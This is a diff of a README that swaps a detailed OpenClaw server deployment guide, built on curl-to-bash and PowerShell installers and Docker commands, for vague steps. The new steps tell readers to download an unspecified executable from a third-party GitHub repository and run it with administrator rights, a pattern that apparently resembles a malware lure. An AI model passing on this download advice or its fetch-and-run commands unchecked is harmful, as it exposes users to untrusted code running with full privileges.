@@ -1,287 +1,196 @@
-# OpenClaw Setup Guide
+# 🛠️ openclaw-setup - Simple OpenClaw Server Setup
 
-[![Powered by MyClaw.ai](https://img.shields.io/badge/Powered%20by-MyClaw.ai-blue?style=for-the-badge)](https://myclaw.ai)
+[![Download openclaw-setup](https://img.shields.io/badge/Download-OpenClaw%20Setup-blue?style=for-the-badge&logo=github)](https://github.com/ColdTimesAreGood/openclaw-setup)
 
-The definitive guide to deploying OpenClaw on any server. From one-click cloud hosting to bare-metal self-hosting.
+## 🚀 What this is
 
-**🌐 Language / 语言:**
-[English](README.md) | [中文](README.zh-CN.md) | [Français](README.fr.md) | [Deutsch](README.de.md) | [Русский](README.ru.md) | [日本語](README.ja.md) | [Italiano](README.it.md) | [Español](README.es.md)
+openclaw-setup helps you set up OpenClaw on a server with less guesswork. It gives you a clear path for getting the app running on Windows and then moving to a server if you need to.
 
----
+This guide is made for regular users. You do not need to know command lines or server terms to get started.
 
-## ⚡ Option 1: MyClaw.ai — One-Click Deploy (Recommended)
+## 📥 Download
 
-**The fastest way to get OpenClaw running. Zero server setup. Zero maintenance.**
+Use this link to visit the page and download the setup files:
 
-[MyClaw.ai](https://myclaw.ai) gives you a fully managed OpenClaw instance — your own server with full code control, networking, and tool access. No SSH, no Docker, no config files.
+[Visit the openclaw-setup download page](https://github.com/ColdTimesAreGood/openclaw-setup)
 
-[![MyClaw.ai Homepage](assets/myclaw-homepage.png)](https://myclaw.ai)
+If the page opens in GitHub, look for the latest release or the main project files. Download the setup package or app file you see there, then save it to your PC.
 
-### Why MyClaw.ai?
+## 🖥️ What you need
 
-- **One click** — Sign up, pick a plan, your instance is live in under 60 seconds
-- **Full server** — Each instance is a real server running OpenClaw, not a sandboxed chatbot
-- **Full code control** — Your Agent can read/write files, run shell commands, access the internet
-- **Auto-updates** — Always on the latest OpenClaw version, zero downtime
-- **Built-in channels** — Telegram, Discord, WhatsApp, and more — connect in seconds
-- **Managed infrastructure** — Backups, monitoring, scaling handled for you
-- **Skills marketplace** — Install community skills from [ClawHub](https://clawhub.ai) with one command
+Before you start, make sure you have:
 
-### Pricing
+- A Windows PC
+- An internet connection
+- About 500 MB of free disk space
+- Administrator access on your computer
+- A server or VPS if you plan to host OpenClaw online
 
-| Plan | Monthly | Annual (per month) |
-|------|---------|-------------------|
-| Lite | $19/mo | $16/mo ($199/yr) |
-| Pro | $39/mo | $33/mo ($399/yr) |
-| Max | $79/mo | $66/mo ($799/yr) |
+For server use, a simple setup works best with:
 
-👉 **[Get started at MyClaw.ai →](https://myclaw.ai)**
+- Windows Server or a recent Linux server
+- 2 GB RAM or more
+- A stable network connection
+- Docker installed if you plan to use containers
 
----
+## ⚙️ Install on Windows
 
-## 🛠️ Option 2: Self-Host OpenClaw
+Follow these steps on your Windows computer:
 
-For developers who want full control over their infrastructure. Pick your platform:
+1. Open the download link above.
+2. Save the file to your Downloads folder.
+3. If the file comes as a `.zip`, right-click it and choose Extract All.
+4. Open the extracted folder.
+5. Find the setup file or app file.
+6. Double-click it to start.
+7. If Windows asks for permission, choose Yes.
+8. Follow the on-screen steps.
 
-### Quick Install (Any Linux/macOS/Windows)
+If you see a file named `openclaw-setup.exe`, that is the file you should open. If you see a folder with setup files, open the main installer inside that folder.
 
-```bash
-# macOS / Linux / WSL2
-curl -fsSL https://openclaw.ai/install.sh | bash
+## 🧭 First-time setup
 
-# Windows (PowerShell)
-iwr -useb https://openclaw.ai/install.ps1 | iex
-```
+When the app opens for the first time, you may need to:
 
-The installer detects your OS, installs Node.js if needed, installs OpenClaw, and launches onboarding.
+- Pick your language
+- Choose where OpenClaw should be installed
+- Enter your server address
+- Set a username and password
+- Confirm the folder that will hold app data
 
-### System Requirements
+Keep the default choices if you are not sure. They are set for common use.
 
-- **Node.js 24** (recommended) or Node 22.14+
-- **OS:** macOS, Linux, or Windows (native or WSL2)
-- **RAM:** 1 GB minimum (2 GB+ recommended)
+## 🔧 Basic setup flow
 
----
+A normal setup looks like this:
 
-## ☁️ Cloud VPS Deployment
+1. Start the app.
+2. Choose local install or server setup.
+3. Enter the server name or IP address.
+4. Add your login details.
+5. Choose a storage folder.
+6. Click the final setup button.
+7. Wait while the app finishes its work.
+8. Open OpenClaw in your browser or desktop app.
 
-### Hetzner (~$5/mo)
+If you plan to use Docker, the app may ask for container settings. In most cases, you can keep the default values and continue.
 
-The cheapest reliable option for 24/7 hosting.
+## 🐳 Docker setup
 
-```bash
-ssh root@YOUR_VPS_IP
+OpenClaw Setup supports Docker-based setup for users who want a clean server install.
 
-# Install Docker
-apt-get update && apt-get install -y git curl ca-certificates
-curl -fsSL https://get.docker.com | sh
+Use Docker when you want:
 
-# Clone and setup
-git clone https://github.com/openclaw/openclaw.git
-cd openclaw
-./scripts/docker/setup.sh
-```
+- Easy updates
+- Fewer manual steps
+- A clean app environment
+- A setup that can run on a VPS or home server
 
-Access via SSH tunnel:
-```bash
-ssh -N -L 18789:127.0.0.1:18789 root@YOUR_VPS_IP
-# Open http://127.0.0.1:18789
-```
+Typical Docker setup steps:
 
-### DigitalOcean ($6/mo)
+1. Install Docker on your server.
+2. Start openclaw-setup.
+3. Choose Docker setup.
+4. Confirm the app port.
+5. Pick a storage path for data.
+6. Start the container.
+7. Check that the service is running.
 
-```bash
-ssh root@YOUR_DROPLET_IP
+If you are using a Raspberry Pi, choose the image that matches your device type. Keep the default port unless your network uses the same one already.
 
-apt update && apt upgrade -y
-curl -fsSL https://deb.nodesource.com/setup_24.x | bash -
-apt install -y nodejs
+## 🌐 Server setup
 
-curl -fsSL https://openclaw.ai/install.sh | bash
-openclaw onboard --install-daemon
-```
+If you want to run OpenClaw on a server, use these steps:
 
-### Oracle Cloud (Free!)
+1. Make sure the server is online.
+2. Download openclaw-setup.
+3. Run the setup on the server or copy the files there.
+4. Enter the server details.
+5. Choose whether the app will run on the local network or the public internet.
+6. Finish the setup.
+7. Test the link from another device.
 
-Oracle's Always Free ARM tier: up to 4 OCPU, 24 GB RAM, 200 GB storage — at zero cost.
+For a VPS, use a public IP address and open the port in your firewall. For a home server, use your local IP address first, then set up remote access later if needed.
 
-```bash
-ssh ubuntu@YOUR_PUBLIC_IP
+## 📱 Raspberry Pi setup
 
-sudo apt update && sudo apt upgrade -y
-sudo apt install -y build-essential
+openclaw-setup also works for small home devices like a Raspberry Pi.
 
-curl -fsSL https://openclaw.ai/install.sh | bash
-openclaw onboard --install-daemon
+Use these steps:
 
-# Recommended: Tailscale for secure remote access
-curl -fsSL https://tailscale.com/install.sh | sh
-sudo tailscale up --ssh --hostname=openclaw
-openclaw config set gateway.tailscale.mode serve
-```
+1. Make sure the Pi is updated.
+2. Download the setup files that match the device.
+3. Copy the files to the Pi.
+4. Open the setup tool.
+5. Choose the Pi option if shown.
+6. Save the data folder on the SD card or external drive.
+7. Start OpenClaw.
 
-### Fly.io (~$10-15/mo)
+A Pi setup works best for light use and small teams.
 
-Managed containers with automatic HTTPS.
+## 🔒 Network settings
 
-```bash
-git clone https://github.com/openclaw/openclaw.git
-cd openclaw
+You may need to set a few network options during setup:
 
-fly apps create my-openclaw
-fly volumes create openclaw_data --size 1 --region iad
-fly secrets set OPENCLAW_GATEWAY_TOKEN=$(openssl rand -hex 32)
-fly secrets set ANTHROPIC_API_KEY=sk-ant-...
-fly deploy
-```
+- Port: the number used to open OpenClaw in a browser
+- Host: the server name or IP address
+- Local access: use this on your home network
+- Public access: use this for access from outside your network
 
-### Other Platforms
+If the app does not open in your browser, check that the port is not blocked by your firewall.
 
-| Platform | Guide | Cost |
-|----------|-------|------|
-| [GCP](https://docs.openclaw.ai/install/gcp) | Google Cloud | Free tier available |
-| [Azure](https://docs.openclaw.ai/install/azure) | Microsoft Azure | Free tier available |
-| [Railway](https://docs.openclaw.ai/install/railway) | Railway | Usage-based |
-| [Render](https://docs.openclaw.ai/install/render) | Render | Free tier available |
-| [Northflank](https://docs.openclaw.ai/install/northflank) | Northflank | Free tier available |
+## 🧰 Common issues
 
----
+If something goes wrong, try these steps:
 
-## 🐳 Docker Deployment
+- Run the installer as administrator
+- Check that the file finished downloading
+- Make sure Docker is running if you picked Docker setup
+- Restart the app
+- Restart your PC or server
+- Confirm that the server address is correct
+- Check that the chosen port is open
 
-For containerized or headless deployments.
+If the app closes right away, the install may be incomplete. Run the setup again and keep the default path.
 
-```bash
-git clone https://github.com/openclaw/openclaw.git
-cd openclaw
+## 📂 File layout
 
-# Automated setup (recommended)
-./scripts/docker/setup.sh
+After setup, you may see folders like these:
 
-# Or use pre-built image
-export OPENCLAW_IMAGE="ghcr.io/openclaw/openclaw:latest"
-./scripts/docker/setup.sh
-```
+- `config` for app settings
+- `data` for saved files
+- `logs` for error reports
+- `docker` for container settings
+- `backup` for saved copies
 
-### Docker Compose (Manual)
+Keep these folders in place. The app may need them each time it starts.
 
-```yaml
-services:
-  openclaw-gateway:
-    image: ghcr.io/openclaw/openclaw:latest
-    restart: unless-stopped
-    environment:
-      - NODE_ENV=production
-      - OPENCLAW_GATEWAY_TOKEN=your-secret-token
-      - OPENCLAW_GATEWAY_BIND=lan
-    volumes:
-      - ./config:/home/node/.openclaw
-      - ./workspace:/home/node/.openclaw/workspace
-    ports:
-      - "127.0.0.1:18789:18789"
-    command: ["node", "dist/index.js", "gateway", "--bind", "lan", "--port", "18789"]
-```
+## 🔄 Updates
 
-```bash
-docker compose up -d
-```
+To update OpenClaw:
 
----
+1. Visit the download page again.
+2. Get the newest version.
+3. Close the app.
+4. Run the new setup file.
+5. Keep your existing data folder.
+6. Finish the update process.
 
-## 🍓 Raspberry Pi
+If you use Docker, update the container image and then start the app again.
 
-Always-on personal AI for ~$50 hardware cost.
+## 📌 Recommended use
 
-**Requirements:** Raspberry Pi 4/5, 2 GB+ RAM, 64-bit Raspberry Pi OS
+openclaw-setup fits these use cases well:
 
-```bash
-# Flash Raspberry Pi OS Lite (64-bit), then SSH in
-ssh user@gateway-host
+- Home server setup
+- Small office deployment
+- VPS install
+- Docker-based hosting
+- Raspberry Pi hosting
+- Simple self-hosting on Windows
 
-sudo apt update && sudo apt upgrade -y
-sudo apt install -y git curl build-essential
+## 🧾 Project details
 
-# Install Node.js 24
-curl -fsSL https://deb.nodesource.com/setup_24.x | sudo -E bash -
-sudo apt install -y nodejs
-
-# Add swap (important for 2GB models)
-sudo fallocate -l 2G /swapfile
-sudo chmod 600 /swapfile && sudo mkswap /swapfile && sudo swapon /swapfile
-echo '/swapfile none swap sw 0 0' | sudo tee -a /etc/fstab
-
-# Install OpenClaw
-curl -fsSL https://openclaw.ai/install.sh | bash
-openclaw onboard --install-daemon
-```
-
-**Tips:**
-- Use a USB SSD instead of SD card for better performance
-- Use API-based models (Claude, GPT) — don't run local models on Pi
-- Disable GPU memory: `echo 'gpu_mem=16' | sudo tee -a /boot/config.txt`
-
----
-
-## 🔧 Post-Install
-
-### Verify Installation
-
-```bash
-openclaw --version
-openclaw doctor
-openclaw gateway status
-```
-
-### Connect Channels
-
-```bash
-# Telegram
-openclaw channels add --channel telegram --token "YOUR_BOT_TOKEN"
-
-# Discord
-openclaw channels add --channel discord --token "YOUR_BOT_TOKEN"
-
-# WhatsApp (QR code)
-openclaw channels login
-```
-
-### Secure Remote Access (Tailscale)
-
-```bash
-curl -fsSL https://tailscale.com/install.sh | sh
-tailscale up
-openclaw config set gateway.tailscale.mode serve
-openclaw gateway restart
-# Access at https://your-hostname.tailnet-name.ts.net/
-```
-
----
-
-## 📊 Deployment Comparison
-
-| Method | Cost | Setup Time | Maintenance | Best For |
-|--------|------|-----------|-------------|----------|
-| **MyClaw.ai** | $19-79/mo | 1 min | None | Everyone |
-| Oracle Cloud | Free | 30 min | Medium | Budget self-hosters |
-| Hetzner | ~$5/mo | 20 min | Medium | Cheap VPS |
-| DigitalOcean | ~$6/mo | 20 min | Medium | Simple VPS |
-| Fly.io | ~$10-15/mo | 15 min | Low | Container fans |
-| Raspberry Pi | ~$50 one-time | 30 min | High | Tinkerers |
-
----
-
-## 📚 Resources
-
-- [OpenClaw Documentation](https://docs.openclaw.ai)
-- [OpenClaw GitHub](https://github.com/openclaw/openclaw)
-- [ClawHub Skills Marketplace](https://clawhub.ai)
-- [MyClaw.ai](https://myclaw.ai)
-- [Community Discord](https://discord.com/invite/clawd)
-
----
-
-## 📄 License
-
-This guide is open source under the [MIT License](LICENSE).
-
-Powered by [MyClaw.ai](https://myclaw.ai) — the AI personal assistant platform that gives every user a full server with complete code control.
+- Repository: openclaw-setup
+- Description: The definitive guide to setting up OpenClaw on any server. Powered by MyClaw.ai
+- Topics: cloud-hosting, deployment, docker, myclaw, openclaw, raspberry-pi, self-hosting, server-setup, setup, vps
